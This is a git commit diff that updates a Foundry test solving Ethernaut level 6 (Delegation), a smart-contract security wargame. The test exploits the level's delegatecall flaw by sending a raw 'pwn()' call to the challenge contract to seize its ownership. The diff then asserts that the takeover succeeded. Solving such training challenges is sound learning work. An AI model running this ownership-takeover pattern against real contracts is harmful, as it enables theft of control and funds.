9a4bf42de730100f9d163987ddaf06813ab6c75d
ShiningSugar35 <2368754631@qq.com>
2025-10-21 14:48:32 +0800

    feat(ethernaut): solve level 6 (Delegation)

--- test/Delegation.t.sol
+++ test/Delegation.t.sol
@@ -8,11 +8,11 @@ interface IDelegation {
 }
 
 interface IDelegate {
-    function pwn() external; 
+    function pwn() external;
 }
 
 contract DelegationTest is Test {
-    IDelegation private delegation = IDelegation(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
+    IDelegation private delegation = IDelegation(0xB2f6aA41C53899669fa3FE4D281e1362Df892BFf);
     address private me = address(this);
 
     function setUp() public {
@@ -20,7 +20,9 @@ contract DelegationTest is Test {
     }
 
     function test_DelegationExploit() public {
-        address(delegation).call(abi.encodeWithSignature("pwn()"));
-        assertEq(level.owner(), player);
+        bytes memory payload = abi.encodeWithSignature("pwn()");
+        (bool success,) = address(delegation).call(payload);
+        assertTrue(success, "Low-level pwn() call failed");
+        assertEq(delegation.owner(), me, "Owner was not changed to me");
     }
 }
